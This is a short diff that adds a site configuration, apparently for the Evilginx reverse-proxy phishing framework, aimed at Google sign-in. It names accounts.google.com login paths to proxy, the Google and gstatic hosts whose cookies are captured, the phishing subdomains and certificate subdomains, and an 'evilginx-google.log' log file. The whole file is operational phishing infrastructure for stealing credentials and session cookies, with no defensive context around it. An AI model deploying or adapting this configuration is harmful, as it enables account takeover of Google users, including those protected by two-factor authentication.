@@ -1,0 +1,12 @@
+[site]
+name=google
+site_conf=["accounts.google.com.conf","ssl.gstatic.com.conf"]
+creds_conf=google.creds
+phish_subdomains=["accounts"]
+phish_paths=["/ServiceLogin","/signin/v2/identifier"]
+target_hosts=["accounts.google.com","ssl.gstatic.com"]
+cookie_hosts=["google.com","gstatic.com"]
+redir_arg=rc
+success_arg=rd
+log_name=evilginx-google.log
+cert_subdomains=["accounts","ssl"]
